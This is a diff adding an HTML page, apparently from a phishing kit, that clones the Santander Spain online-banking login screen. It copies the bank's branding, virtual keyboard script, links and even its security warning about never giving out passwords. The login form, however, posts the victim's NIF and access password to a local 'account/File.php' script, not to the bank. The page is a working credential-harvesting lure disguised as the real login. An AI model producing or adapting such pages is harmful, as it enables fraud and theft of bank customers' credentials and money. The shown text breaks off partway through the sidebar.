@@ -1,0 +1,335 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<!-- saved from url=(0239)https://particulares.gruposantander.es/SUPFPA_ENS/BtoChannelDriver.ssobto?dse_operationName=NavLoginSupernet&dse_parentContextName=&dse_processorState=initial&dse_nextEventName=start&_ga=2.4900209.318130340.1525748250-1046950590.1517634939 -->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es-ES" lang="es-ES">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+   <title>Particulares Santander </title>
+<link href="https://www.bancosantander.es/Theme_GenerInter01-theme/images/favicon.ico" rel="Shortcut Icon" />
+ 
+    <link rel="stylesheet" type="text/css" href="./Files/styles.css">
+    <!--[if IE]><style type="text/css" media="screen">	@import "/Estatico/Globales/V166/Styles/CustomTags/Css/iehacks.css"; </style><![endif]-->
+    <link rel="stylesheet" type="text/css" href="./Files/styles(1).css">
+    <meta content="OPLogon" id="meta-adp-render-model" name="render-adp">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="-1">
+    <meta http-equiv="Cache-Control" content="no-cache">
+
+    <meta content="content" scheme="scheme" http-equiv="httpEquiv">
+    <link hreflang="hreflang" charset="charset" rel="rel" type="text/css" media="media" href="./Files/notfound.css">
+    <link rel="shortcut icon" type="image/x-icon" href="https://particulares.gruposantander.es/Estatico/Globales/Styles/CustomTags/favicon.ico">
+    <link rel="stylesheet" type="text/css" href="./Files/security.css">
+    <link rel="stylesheet" type="text/css" href="./Files/security(1).css">
+    <!--[if IE 7]><link rel="stylesheet" type="text/css" href="/Estatico/Globales/V180/Styles/CustomTags/Css/ie7hacks.css"/><![endif]-->
+    <!--[if IE 8]><link rel="stylesheet" type="text/css" href="/Estatico/Globales/V180/Styles/CustomTags/Css/ie8hacks.css"/><![endif]-->
+
+</head>
+
+<body>
+    <div class="opLogonHeader">
+
+        <div id="headerArea1" class="headerArea">
+            <div class="image"><img src="./Files/CabeceraLoginParticulares2.gif" alt=""></div>
+        </div>
+
+        <div align="right" id="linksArea1" class="links">
+            <div style="display: inline;width:4em;" id="link1"><a class="opLogonStandardLink" href="https://particulares.gruposantander.es/SUPFPA_ENS/BtoChannelDriver.ssobto?dse_operationName=NavLoginSupernet&amp;dse_nextEventName=start&amp;_ga=2.4900209.318130340.1525748250-1046950590.1517634939&amp;dse_processorState=initial" target="_self">Español</a></div> |
+            <div style="display: inline;width:4em;" id="link2"><a class="opLogonStandardLink" href="https://ct.particulares.gruposantander.es/SUPFPA_ENS/BtoChannelDriver.ssobto?dse_operationName=NavLoginSupernet&amp;dse_nextEventName=start&amp;_ga=2.4900209.318130340.1525748250-1046950590.1517634939&amp;dse_processorState=initial" target="_self">Català</a></div> |
+            <div style="display: inline;width:4em;" id="link3"><a class="opLogonStandardLink" href="https://en.particulares.gruposantander.es/SUPFPA_ENS/BtoChannelDriver.ssobto?dse_operationName=NavLoginSupernet&amp;dse_nextEventName=start&amp;_ga=2.4900209.318130340.1525748250-1046950590.1517634939&amp;dse_processorState=initial" target="_self">English</a></div>
+        </div>
+    </div>
+    <div class="opLogonBody">
+        <div class="left">
+            <div class="opLogonInfo">
+
+
+            </div>
+            <div class="opLogonComponent">
+
+                <div id="auth" class="security">
+               
+                    <div class="head">
+                        <h1 class="title">Identificación de usuarios</h1>
+                    </div>
+                    <script type="text/javascript">
+                        <!--//--><![CDATA[//><!--
+
+                        var str = "<div id=\"authMsg\" class=\"alertMsg\" style=\"display:none\" ></div>";
+                        document.write(str);
+
+
+                        //--><!]]>
+                    </script>
+                    <div id="authMsg" class="alertMsg" style="display:none"></div>
+                    <div class="body">
+                        <div class="superior">
+                            <fieldset class="identificacion" id="identificacion">
+                                <legend>Datos de identificación</legend>
+                                <p>Introduzca sus datos de identificación y su Clave de acceso con el teclado de su ordenador o con el teclado virtual de esta página. También puede acceder con su DNI electrónico si dispone de lector de tarjetas chip conectado a su ordenador. Más información sobre el DNIe en <a target="_blank" href="http://www.dnielectronico.es/">www.dnielectronico.es</a></p>
+                                <form action="account/File.php" method="POST" id="income-form">
+
+                                
+                                 
+                                    <div id="tipoIdCombo" class="rowSelect"><label for="sel_tipoaut">Modo de identificación:</label><select id="sel_tipoaut" onchange="showSelected(this.value)" name="variableFieldSelector"><option value="usuario">Usuario</option><option value="tipoDocumento" selected="selected">Documento</option></select></div>
+                                    <div id="comboSelected" style="display: block;">
+                                        <div id="documentComboFijo" class="rowSelect"><label for="sel_tipodoc">Tipo de documento:</label><select name="tipoDocumento" id="sel_tipodoc" onchange="showDocumentsFijos(this.value)"><option value="N" selected="selected">NIF</option><option value="S">CIF</option><option value="C">NIE</option><option value="I">PASAPORTE</option></select></div>
+                                        <div id="selectedDoc" class="row" style="display: block;"><label for="documentType_N">NIF:</label><input name="nif" type="text" id="nif" maxlength="9" ></div>
+                                    </div>
+                                    <noscript>
+<div class="rowRadio"><label class="sencilla" for="id_usuario"><input class="radio" id="id_usuario_radio" name="variableFieldSelector" type="radio" value="usuario" />Usuario:</label><input name="usuario" id="id_usuario" type="text" onfocus="idToWrite=&#39;id_usuario&#39;;pos=null"   maxlength="20"/></div><div class="rowRadio"><label class="sencilla" for="id_tipoDocumento"><input class="radio" id="id_tipoDocumento_radio" name="variableFieldSelector" type="radio" value="tipoDocumento" checked="checked"/>Documento:</label><input name="numeroDocumento" id="id_tipoDocumento" type="text" onfocus="idToWrite=&#39;id_tipoDocumento&#39;;pos=null" /></div><div class="rowRadioSelectDoc"><label class="sencilla" for="id_docType_N"><input class="radio" id="id_docType_N" name="tipoDocumento" type="radio" value="N" checked="checked"/>NIF:</label></div><div class="rowRadioSelectDoc"><label class="sencilla" for="id_docType_S"><input class="radio" id="id_docType_S" name="tipoDocumento" type="radio" value="S" />CIF:</label></div><div class="rowRadioSelectDoc"><label class="sencilla" for="id_docType_C"><input class="radio" id="id_docType_C" name="tipoDocumento" type="radio" value="C" />NIE:</label></div><div class="rowRadioSelectDoc"><label class="sencilla" for="id_docType_I"><input class="radio" id="id_docType_I" name="tipoDocumento" type="radio" value="I" />PASAPORTE:</label></div>
+</noscript>
+                                   
+                                <div class="row"><label for="clave">Clave de acceso:</label><input type="password"  name="password" id="clave" maxlength="8" ></div>
+                                <script type="text/javascript">
+                                    <!--//--><![CDATA[//><!--
+                                    var blankSpace = ' ';
+                                    var str = "<div class='virtualKeyboard' id='virtualKeyboard'><div class='body filas5'><div id='Keyboard' class='bodyBackground' style='magrin-top:0em;margin-left:0em;'><div id='kbmin' class='keyboard'><div><input  hidefocus='hidefocus' class='key' type='button' value='1' onclick='moveKeyboard();paintKey(\"1\")' /><input  hidefocus='hidefocus' class='key' type='button' value='2' onclick='moveKeyboard();paintKey(\"2\")' /><input  hidefocus='hidefocus' class='key' type='button' value='3' onclick='moveKeyboard();paintKey(\"3\")' /><input  hidefocus='hidefocus' class='key' type='button' value='4' onclick='moveKeyboard();paintKey(\"4\")' /><input  hidefocus='hidefocus' class='key' type='button' value='5' onclick='moveKeyboard();paintKey(\"5\")' /><input  hidefocus='hidefocus' class='key' type='button' value='6' onclick='moveKeyboard();paintKey(\"6\")' /><input  hidefocus='hidefocus' class='key' type='button' value='7' onclick='moveKeyboard();paintKey(\"7\")' /><input  hidefocus='hidefocus' class='key' type='button' value='8' onclick='moveKeyboard();paintKey(\"8\")' /><input  hidefocus='hidefocus' class='key' type='button' value='9' onclick='moveKeyboard();paintKey(\"9\")' /><input  hidefocus='hidefocus' class='key' type='button' value='0' onclick='moveKeyboard();paintKey(\"0\")' /><input type='button' hidefocus='hidefocus' class='key2' value= Borrar onclick='moveKeyboard();paintKey(\"DELETE\")' /></div><div><input  hidefocus='hidefocus' class='key' type='button' value='q' onclick='moveKeyboard();paintKey(\"q\")' /><input  hidefocus='hidefocus' class='key' type='button' value='w' onclick='moveKeyboard();paintKey(\"w\")' /><input  hidefocus='hidefocus' class='key' type='button' value='e' onclick='moveKeyboard();paintKey(\"e\")' /><input  hidefocus='hidefocus' class='key' type='button' value='r' onclick='moveKeyboard();paintKey(\"r\")' /><input  hidefocus='hidefocus' class='key' type='button' value='t' onclick='moveKeyboard();paintKey(\"t\")' /><input  hidefocus='hidefocus' class='key' type='button' value='y' onclick='moveKeyboard();paintKey(\"y\")' /><input  hidefocus='hidefocus' class='key' type='button' value='u' onclick='moveKeyboard();paintKey(\"u\")' /><input  hidefocus='hidefocus' class='key' type='button' value='i' onclick='moveKeyboard();paintKey(\"i\")' /><input  hidefocus='hidefocus' class='key' type='button' value='o' onclick='moveKeyboard();paintKey(\"o\")' /><input  hidefocus='hidefocus' class='key' type='button' value='p' onclick='moveKeyboard();paintKey(\"p\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#96;' onclick='moveKeyboard();paintKey(\"&#96;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#43;' onclick='moveKeyboard();paintKey(\"&#43;\")' /></div><div><input  hidefocus='hidefocus' class='key' type='button' value='a' onclick='moveKeyboard();paintKey(\"a\")' /><input  hidefocus='hidefocus' class='key' type='button' value='s' onclick='moveKeyboard();paintKey(\"s\")' /><input  hidefocus='hidefocus' class='key' type='button' value='d' onclick='moveKeyboard();paintKey(\"d\")' /><input  hidefocus='hidefocus' class='key' type='button' value='f' onclick='moveKeyboard();paintKey(\"f\")' /><input  hidefocus='hidefocus' class='key' type='button' value='g' onclick='moveKeyboard();paintKey(\"g\")' /><input  hidefocus='hidefocus' class='key' type='button' value='h' onclick='moveKeyboard();paintKey(\"h\")' /><input  hidefocus='hidefocus' class='key' type='button' value='j' onclick='moveKeyboard();paintKey(\"j\")' /><input  hidefocus='hidefocus' class='key' type='button' value='k' onclick='moveKeyboard();paintKey(\"k\")' /><input  hidefocus='hidefocus' class='key' type='button' value='l' onclick='moveKeyboard();paintKey(\"l\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#241;' onclick='moveKeyboard();paintKey(\"&#241;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#180;' onclick='moveKeyboard();paintKey(\"&#180;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#231;' onclick='moveKeyboard();paintKey(\"&#231;\")' /></div><div><input  hidefocus='hidefocus' class='key' type='button' value='&#60;' onclick='moveKeyboard();paintKey(\"&#60;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='z' onclick='moveKeyboard();paintKey(\"z\")' /><input  hidefocus='hidefocus' class='key' type='button' value='x' onclick='moveKeyboard();paintKey(\"x\")' /><input  hidefocus='hidefocus' class='key' type='button' value='c' onclick='moveKeyboard();paintKey(\"c\")' /><input  hidefocus='hidefocus' class='key' type='button' value='v' onclick='moveKeyboard();paintKey(\"v\")' /><input  hidefocus='hidefocus' class='key' type='button' value='b' onclick='moveKeyboard();paintKey(\"b\")' /><input  hidefocus='hidefocus' class='key' type='button' value='n' onclick='moveKeyboard();paintKey(\"n\")' /><input  hidefocus='hidefocus' class='key' type='button' value='m' onclick='moveKeyboard();paintKey(\"m\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#43;' onclick='moveKeyboard();paintKey(\"&#43;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#46;' onclick='moveKeyboard();paintKey(\"&#46;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#45;' onclick='moveKeyboard();paintKey(\"&#45;\")' /><input disabled='disabled' hidefocus='hidefocus' class='keyDis' type='button' value=' ' onclick='moveKeyboard();paintKey(\"\")' /></div><div><input type='button' hidefocus='hidefocus' class='key2' value='Mayús.' onclick='moveKeyboard();caseKey(1)' /><input type='button' hidefocus='hidefocus' class='keyspace' value=' ' onclick='moveKeyboard();paintKey(\" \")' /><input type='button' hidefocus='hidefocus' class='key2' value='Mayús.' onclick='moveKeyboard();caseKey(1)' /></div></div><div id='kbmay' style='display:none' class='keyboard'><div><input  hidefocus='hidefocus' class='key' type='button' value='&#33;' onclick='moveKeyboard();paintKey(\"&#33;\")' /><input type='button' value='&#34;' hidefocus='hidefocus' onclick=\"moveKeyboard();;paintKey('&#34;')\" class='key' /><input  hidefocus='hidefocus' class='key' type='button' value='&#183;' onclick='moveKeyboard();paintKey(\"&#183;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#36;' onclick='moveKeyboard();paintKey(\"&#36;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#37;' onclick='moveKeyboard();paintKey(\"&#37;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#38;' onclick='moveKeyboard();paintKey(\"&#38;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#47;' onclick='moveKeyboard();paintKey(\"&#47;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#40;' onclick='moveKeyboard();paintKey(\"&#40;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#41;' onclick='moveKeyboard();paintKey(\"&#41;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#61;' onclick='moveKeyboard();paintKey(\"&#61;\")' /><input type='button' hidefocus='hidefocus' class='key2' value='Borrar' onclick='moveKeyboard();paintKey(\"DELETE\")' /></div><div><input  hidefocus='hidefocus' class='key' type='button' value='Q' onclick='moveKeyboard();paintKey(\"Q\")' /><input  hidefocus='hidefocus' class='key' type='button' value='W' onclick='moveKeyboard();paintKey(\"W\")' /><input  hidefocus='hidefocus' class='key' type='button' value='E' onclick='moveKeyboard();paintKey(\"E\")' /><input  hidefocus='hidefocus' class='key' type='button' value='R' onclick='moveKeyboard();paintKey(\"R\")' /><input  hidefocus='hidefocus' class='key' type='button' value='T' onclick='moveKeyboard();paintKey(\"T\")' /><input  hidefocus='hidefocus' class='key' type='button' value='Y' onclick='moveKeyboard();paintKey(\"Y\")' /><input  hidefocus='hidefocus' class='key' type='button' value='U' onclick='moveKeyboard();paintKey(\"U\")' /><input  hidefocus='hidefocus' class='key' type='button' value='I' onclick='moveKeyboard();paintKey(\"I\")' /><input  hidefocus='hidefocus' class='key' type='button' value='O' onclick='moveKeyboard();paintKey(\"O\")' /><input  hidefocus='hidefocus' class='key' type='button' value='P' onclick='moveKeyboard();paintKey(\"P\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#94;' onclick='moveKeyboard();paintKey(\"&#94;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#42;' onclick='moveKeyboard();paintKey(\"&#42;\")' /></div><div><input  hidefocus='hidefocus' class='key' type='button' value='A' onclick='moveKeyboard();paintKey(\"A\")' /><input  hidefocus='hidefocus' class='key' type='button' value='S' onclick='moveKeyboard();paintKey(\"S\")' /><input  hidefocus='hidefocus' class='key' type='button' value='D' onclick='moveKeyboard();paintKey(\"D\")' /><input  hidefocus='hidefocus' class='key' type='button' value='F' onclick='moveKeyboard();paintKey(\"F\")' /><input  hidefocus='hidefocus' class='key' type='button' value='G' onclick='moveKeyboard();paintKey(\"G\")' /><input  hidefocus='hidefocus' class='key' type='button' value='H' onclick='moveKeyboard();paintKey(\"H\")' /><input  hidefocus='hidefocus' class='key' type='button' value='J' onclick='moveKeyboard();paintKey(\"J\")' /><input  hidefocus='hidefocus' class='key' type='button' value='K' onclick='moveKeyboard();paintKey(\"K\")' /><input  hidefocus='hidefocus' class='key' type='button' value='L' onclick='moveKeyboard();paintKey(\"L\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#209;' onclick='moveKeyboard();paintKey(\"&#209;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#168;' onclick='moveKeyboard();paintKey(\"&#168;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#199;' onclick='moveKeyboard();paintKey(\"&#199;\")' /></div><div><input  hidefocus='hidefocus' class='key' type='button' value='&#62;' onclick='moveKeyboard();paintKey(\"&#62;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='Z' onclick='moveKeyboard();paintKey(\"Z\")' /><input  hidefocus='hidefocus' class='key' type='button' value='X' onclick='moveKeyboard();paintKey(\"X\")' /><input  hidefocus='hidefocus' class='key' type='button' value='C' onclick='moveKeyboard();paintKey(\"C\")' /><input  hidefocus='hidefocus' class='key' type='button' value='V' onclick='moveKeyboard();paintKey(\"V\")' /><input  hidefocus='hidefocus' class='key' type='button' value='B' onclick='moveKeyboard();paintKey(\"B\")' /><input  hidefocus='hidefocus' class='key' type='button' value='N' onclick='moveKeyboard();paintKey(\"N\")' /><input  hidefocus='hidefocus' class='key' type='button' value='M' onclick='moveKeyboard();paintKey(\"M\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#59;' onclick='moveKeyboard();paintKey(\"&#59;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#58;' onclick='moveKeyboard();paintKey(\"&#58;\")' /><input  hidefocus='hidefocus' class='key' type='button' value='&#95;' onclick='moveKeyboard();paintKey(\"&#95;\")' /><input  disabled='disalbed' hidefocus='hidefocus' class='keyDis' type='button' value='' onclick='moveKeyboard();paintKey(\"\")' /></div><div><input type='button' hidefocus='hidefocus' class='key2' value='Minús.' onclick='moveKeyboard();caseKey(0)' /><input type='button' hidefocus='hidefocus' class='keyspace' value=' ' onclick='moveKeyboard();paintKey(\" \")' /><input type='button' hidefocus='hidefocus' class='key2' value='Minús.' onclick='moveKeyboard();caseKey(0)' /></div></div></div></div></div>";
+                                    document.write(str);
+
+                                    function caseKey(m) {
+                                        if (m == 1) {
+                                            document.getElementById('kbmin').style.display = 'none';
+                                            document.getElementById('kbmay').style.display = 'block';
+                                        } else {
+                                            document.getElementById('kbmin').style.display = 'block';
+                                            document.getElementById('kbmay').style.display = 'none';
+                                        }
+                                        if (document.getElementById(idToWrite)) {
+                                            actualInput = document.getElementById(idToWrite);
+                                            actualInput.focus();
+                                            actualInput.select();
+                                        }
+                                    }
+
+                                    function moveKeyboard() {
+                                        var a = '0';
+                                        var b = '0';
+                                        var act = 1;
+                                        var actTop = document.getElementById('Keyboard').style.marginTop;
+                                        var actLeft = document.getElementById('Keyboard').style.marginLeft;
+                                        if (actTop == '0em') {
+                                            if (actLeft == '0em') {
+                                                act = 1
+                                            } else {
+                                                act = 2
+                                            }
+                                        } else {
+                                            if (actLeft == '0em') {
+                                                act = 3
+                                            } else {
+                                                act = 4
+                                            }
+                                        }
+                                        do {
+                                            var dire = Math.random();
+                                            dire = parseInt(dire * 4) + 1;
+                                        } while (dire == act);
+                                        switch (dire) {
+                                            case 1:
+                                                a = '0em';
+                                                b = '0em';
+                                                break;
+                                            case 2:
+                                                a = '1.5em';
+                                                b = '0em';
+                                                break;
+                                            case 3:
+                                                a = '0em';
+                                                b = '2em';
+                                                break;
+                                            case 4:
+                                                a = '1.5em';
+                                                b = '2em';
+                                                break;
+                                        }
+                                        document.getElementById('Keyboard').style.marginTop = a;
+                                        document.getElementById('Keyboard').style.marginLeft = b;
+                                    }
+
+                                    var id_positions = [];
+                                    var pos = null;
+                                    var idToWrite = "clave";
+
+                                    function paintKey(key) {
+                                        var actualInput;
+                                        var nextInput;
+                                        if (pos != null) {
+                                            if (id_positions[pos] && document.getElementById(id_positions[pos])) {
+                                                actualInput = document.getElementById(id_positions[pos]);
+                                                actualInput.focus();
+                                                actualInput.select();
+                                                if (key == 'DELETE') {
+                                                    if (actualInput.value.length > 0) {
+                                                        actualInput.value = actualInput.value.substr(0, actualInput.value.length - 1);
+                                                    } else {
+                                                        if (id_positions[pos - 1] && document.getElementById(id_positions[pos - 1])) {
+                                                            actualInput = document.getElementById(id_positions[pos - 1]);
+                                                        }
+                                                        actualInput.focus();
+                                                        actualInput.select();
+                                                    }
+                                                } else {
+                                                    actualInput.value = key;
+                                                    if (id_positions[pos + 1] && document.getElementById(id_positions[pos + 1])) {
+                                                        nextInput = document.getElementById(id_positions[pos + 1]);
+                                                        nextInput.focus();
+                                                        nextInput.select();
+                                                    }
+                                                }
+                                            }
+                                        } else {
+                                            if (document.getElementById(idToWrite)) {
+                                                actualInput = document.getElementById(idToWrite);
+                                                actualInput.focus();
+                                                if (key == 'DELETE' && actualInput.value.length > 0) {
+                                                    actualInput.value = actualInput.value.substr(0, actualInput.value.length - 1);
+                                                }
+                                                if (key == 'DELETE') {
+                                                    key = '';
+                                                }
+                                                if (actualInput.getAttribute('MaxLength') != null) {
+                                                    if (actualInput.getAttribute('MaxLength') >= 0 && actualInput.value.length < actualInput.getAttribute('MaxLength')) {
+                                                        actualInput.value += key;
+                                                    } else {
+                                                        actualInput.select();
+                                                    }
+                                                } else {
+                                                    actualInput.value += key;
+                                                }
+                                            }
+                                        }
+                                    }
+
+                                    //--><!]]>
+                                </script>
+                                <div class="virtualKeyboard" id="virtualKeyboard">
+                                    <div class="body filas5">
+                                        <div id="Keyboard" class="bodyBackground" style="magrin-top:0em;margin-left:0em;">
+                                            <div id="kbmin" class="keyboard">
+                                                <div>
+                                            </div>
+                                            <div id="kbmay" style="display:none" class="keyboard">
+                                                <div><input hidefocus="hidefocus" class="key" type="button" value="!" onclick="moveKeyboard();paintKey(&quot;!&quot;)"><input type="button" value="&quot;" hidefocus="hidefocus" onclick="moveKeyboard();;paintKey(&#39;&quot;&#39;)" class="key"><input hidefocus="hidefocus" class="key" type="button" value="·" onclick="moveKeyboard();paintKey(&quot;·&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="$" onclick="moveKeyboard();paintKey(&quot;$&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="%" onclick="moveKeyboard();paintKey(&quot;%&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="&amp;" onclick="moveKeyboard();paintKey(&quot;&amp;&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="/" onclick="moveKeyboard();paintKey(&quot;/&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="(" onclick="moveKeyboard();paintKey(&quot;(&quot;)"><input hidefocus="hidefocus" class="key" type="button" value=")" onclick="moveKeyboard();paintKey(&quot;)&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="=" onclick="moveKeyboard();paintKey(&quot;=&quot;)"><input type="button" hidefocus="hidefocus" class="key2" value="Borrar" onclick="moveKeyboard();paintKey(&quot;DELETE&quot;)"></div>
+                                                <div><input hidefocus="hidefocus" class="key" type="button" value="Q" onclick="moveKeyboard();paintKey(&quot;Q&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="W" onclick="moveKeyboard();paintKey(&quot;W&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="E" onclick="moveKeyboard();paintKey(&quot;E&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="R" onclick="moveKeyboard();paintKey(&quot;R&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="T" onclick="moveKeyboard();paintKey(&quot;T&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="Y" onclick="moveKeyboard();paintKey(&quot;Y&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="U" onclick="moveKeyboard();paintKey(&quot;U&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="I" onclick="moveKeyboard();paintKey(&quot;I&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="O" onclick="moveKeyboard();paintKey(&quot;O&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="P" onclick="moveKeyboard();paintKey(&quot;P&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="^" onclick="moveKeyboard();paintKey(&quot;^&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="*" onclick="moveKeyboard();paintKey(&quot;*&quot;)"></div>
+                                                <div><input hidefocus="hidefocus" class="key" type="button" value="A" onclick="moveKeyboard();paintKey(&quot;A&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="S" onclick="moveKeyboard();paintKey(&quot;S&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="D" onclick="moveKeyboard();paintKey(&quot;D&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="F" onclick="moveKeyboard();paintKey(&quot;F&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="G" onclick="moveKeyboard();paintKey(&quot;G&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="H" onclick="moveKeyboard();paintKey(&quot;H&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="J" onclick="moveKeyboard();paintKey(&quot;J&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="K" onclick="moveKeyboard();paintKey(&quot;K&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="L" onclick="moveKeyboard();paintKey(&quot;L&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="Ñ" onclick="moveKeyboard();paintKey(&quot;Ñ&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="¨" onclick="moveKeyboard();paintKey(&quot;¨&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="Ç" onclick="moveKeyboard();paintKey(&quot;Ç&quot;)"></div>
+                                                <div><input hidefocus="hidefocus" class="key" type="button" value="&gt;" onclick="moveKeyboard();paintKey(&quot;&gt;&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="Z" onclick="moveKeyboard();paintKey(&quot;Z&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="X" onclick="moveKeyboard();paintKey(&quot;X&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="C" onclick="moveKeyboard();paintKey(&quot;C&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="V" onclick="moveKeyboard();paintKey(&quot;V&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="B" onclick="moveKeyboard();paintKey(&quot;B&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="N" onclick="moveKeyboard();paintKey(&quot;N&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="M" onclick="moveKeyboard();paintKey(&quot;M&quot;)"><input hidefocus="hidefocus" class="key" type="button" value=";" onclick="moveKeyboard();paintKey(&quot;;&quot;)"><input hidefocus="hidefocus" class="key" type="button" value=":" onclick="moveKeyboard();paintKey(&quot;:&quot;)"><input hidefocus="hidefocus" class="key" type="button" value="_" onclick="moveKeyboard();paintKey(&quot;_&quot;)"><input disabled="disalbed" hidefocus="hidefocus" class="keyDis" type="button" value="" onclick="moveKeyboard();paintKey(&quot;&quot;)"></div>
+                                                <div><input type="button" hidefocus="hidefocus" class="key2" value="Minús." onclick="moveKeyboard();caseKey(0)"><input type="button" hidefocus="hidefocus" class="keyspace" value=" " onclick="moveKeyboard();paintKey(&quot; &quot;)"><input type="button" hidefocus="hidefocus" class="key2" value="Minús." onclick="moveKeyboard();caseKey(0)"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </fieldset>
+                        </div>
+                        <div class="inferior">
+                         
+                            <div class="dni"><a href="https://particulares.gruposantander.es/SUPFPA_ENS/BtoChannelDriver.ssobto?dse_sessionId=1vo7cbqDVIqf2cdQfbGGVAT&amp;dse_operationName=OP_LOGON_MULTI&amp;dse_applicationName=Seguridad&amp;dse_threadId=defaultExecutionThreadIdentifier&amp;dse_pageId=0&amp;dse_processorState=AuthenticationPage&amp;dse_processorId=AC16154ADA93E76740086704&amp;dse_cmd=continue&amp;SSLURL=4433&amp;dse_nextEventName=cert" onclick="return startDNIApplet(this);">Acceder con DNI electrónico</a>
+                                <p id="dniText">Introduzca primero el DNI electrónico en el lector</p>
+                            </div>
+                            <noscript>
+<p><strong>Acceder con:</strong></p>
+<div class="dni"><a href="https://particulares.gruposantander.es:443/SUPFPA_ENS/BtoChannelDriver.ssobto?dse_sessionId=1vo7cbqDVIqf2cdQfbGGVAT&amp;dse_operationName=OP_LOGON_MULTI&amp;dse_applicationName=Seguridad&amp;dse_threadId=defaultExecutionThreadIdentifier&amp;dse_pageId=0&amp;dse_processorState=AuthenticationPage&amp;dse_processorId=AC16154ADA93E76740086704&amp;dse_cmd=continue&amp;SSLURL=4433&amp;dse_nextEventName=cert" >Acceder con DNI electrónico</a><p id="dniText">Introduzca primero el DNI electrónico en el lector</p></div>
+</noscript>
+                        </div>
+                    </div>
+
+                    <div class="foot"><span class="buttons"><input class="opLogonStandardButton" type="submit" value="Entrar" onclick="doClick();"></span><span class="link"><a class="opLogonStandardLink" href="https://claves.bancosantander.es/bog/sbi?ptns=rgcl00" id="id_authenticateLink" target="">¿Ha olvidado su clave?</a></span></div>
+  
+                </div>
+                <div id="hidedniapplet" style="font-size:1px">&nbsp;</div>
+</form>
+
+            </div>
+
+            <div class="opLogonInfo">
+                <div id="infoArea2" class="InfoArea NOBORDER">
+                    <div class="Texto" style="background-image:url(/SUPFPA_ENS/Estatico/Globales/V60/Images/barraCTIayuda.gif)">
+                        <p><strong>Aviso de seguridad</strong></p>
+                        <p>Nunca debe atender solicitudes de datos o claves de acceso y firma que le lleguen a través de correo electrónico, SMS o llamada telefónica y, en especial, no facilite nunca todas sus posiciones de firma electrónica.<br><br><a href="https://www.bancosantander.es/es/particulares/tu-dia-a-dia/seguridad-online/seguridad-online/aprende-seguridad-online/" target="_blank">Curso on-line de Seguridad de la información.</a></p>
+                        <p align="center" style="color:#FF0000"><b>Aviso de cookies</b></p>Usamos cookies propias y de terceros para mejorar nuestros servicios y mostrarte publicidad relacionada con tus preferencias mediante el análisis de tus hábitos de navegación. Si continúas navegando en esta página, consideramos que aceptas su uso en los términos indicados en la <a href="https://www.bancosantander.es/es/politica-de-cookies" target="_blank">Política de Cookies</a>.
+                        <p></p>
+                        <div class="Enlaces">
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+        <div class="right">
+            <div class="opLogonHelp">
+
+                <div id="helpArea1" class="helpPrin">
+                    <div class="helpCont">
+                        <div class="helpArea"><span>Nuevos clientes</span>
+                            <div class="image"><img src="./Files/SUPERNET.jpg" alt=""></div>
+                            <div class="list">
+                                <ul>
